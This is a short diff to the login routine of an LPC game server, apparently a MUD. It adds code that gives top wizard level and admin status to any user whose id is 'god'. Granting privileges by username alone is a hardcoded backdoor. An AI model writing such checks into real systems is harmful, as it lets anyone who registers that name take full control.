@@ -600,6 +600,12 @@ varargs void enter_world(object ob, object user, int silent)
     }
 */
 
+   // 给 god 账号自动授予最高权限
+   if( lower_case(user->query("id")) == "god" ) {
+      user->set("wiz_level", 5);
+      user->set("status", "(admin)");
+   }
+
    write("目前权限：" + wizhood(user) + "\n");
    user->setup();
 
